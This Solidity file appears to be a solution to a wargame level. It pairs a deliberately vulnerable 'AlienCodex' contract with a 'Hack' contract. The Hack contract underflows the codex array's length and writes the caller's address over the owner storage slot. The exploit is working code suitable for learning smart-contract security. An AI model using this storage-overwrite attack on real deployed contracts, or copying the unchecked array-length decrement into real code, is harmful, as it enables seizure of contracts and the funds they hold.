// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "hardhat/console.sol";

/**
 * @title Owner
 * @dev Set & change owner
 */
contract Owner {
    address private owner;

    // event for EVM logging
    event OwnerSet(address indexed oldOwner, address indexed newOwner);

    // modifier to check if caller is owner
    modifier isOwner() {
        // If the first argument of 'require' evaluates to 'false', execution terminates and all
        // changes to the state and to Ether balances are reverted.
        // This used to consume all gas in old EVM versions, but not anymore.
        // It is often a good idea to use 'require' to check if functions are called correctly.
        // As a second argument, you can also provide an explanation about what went wrong.
        require(msg.sender == owner, "Caller is not owner");
        _;
    }

    /**
     * @dev Set contract deployer as owner
     */
    constructor() public {
        console.log("Owner contract deployed by:", msg.sender);
        owner = msg.sender; // 'msg.sender' is sender of current call, contract deployer for a constructor
        emit OwnerSet(address(0), owner);
    }

    /**
     * @dev Change owner
     * @param newOwner address of new owner
     */
    function changeOwner(address newOwner) public isOwner {
        require(
            newOwner != address(0),
            "New owner should not be the zero address"
        );
        emit OwnerSet(owner, newOwner);
        owner = newOwner;
    }

    /**
     * @dev Return owner address
     * @return address of owner
     */
    function getOwner() external view returns (address) {
        return owner;
    }
}

contract AlienCodex is Owner {
    bool public contact;
    bytes32[] public codex;

    modifier contacted() {
        assert(contact);
        _;
    }

    function makeContact() public {
        contact = true;
    }

    function record(bytes32 _content) public contacted {
        codex.push(_content);
    }

    function retract() public contacted {
        codex.length--;
    }

    function revise(uint256 i, bytes32 _content) public contacted {
        //selector 0xff15b9b0
        codex[i] = _content;
    }
}

interface IAllien {
    function makeContact() external;
    function revise(uint256 i, bytes32 _content) external;
    function retract() external;
}

contract Hack {
IAllien public alien;


    constructor (address _target) public {
    alien = IAllien(_target);
    }

    function code(
        string memory func,
        uint256 arg1,
        bytes32 arg2
    ) public pure returns (bytes memory result) {
        result = abi.encodeWithSignature(func, arg1, arg2);

        return result;
    }

    function findIforRevise(uint256 _slotNum) public pure returns(uint i) {
  uint  zero;
  i = zero - uint256(keccak256(abi.encode(uint256(_slotNum))));
  return i;
    }
    
  // owner in slot 1;
   function pwn(uint256 _slotNum) public {
    alien.makeContact();
    alien.retract();
    uint256 i = findIforRevise(_slotNum);
    alien.revise(i, bytes32(uint256(uint160(msg.sender))));
   }

}
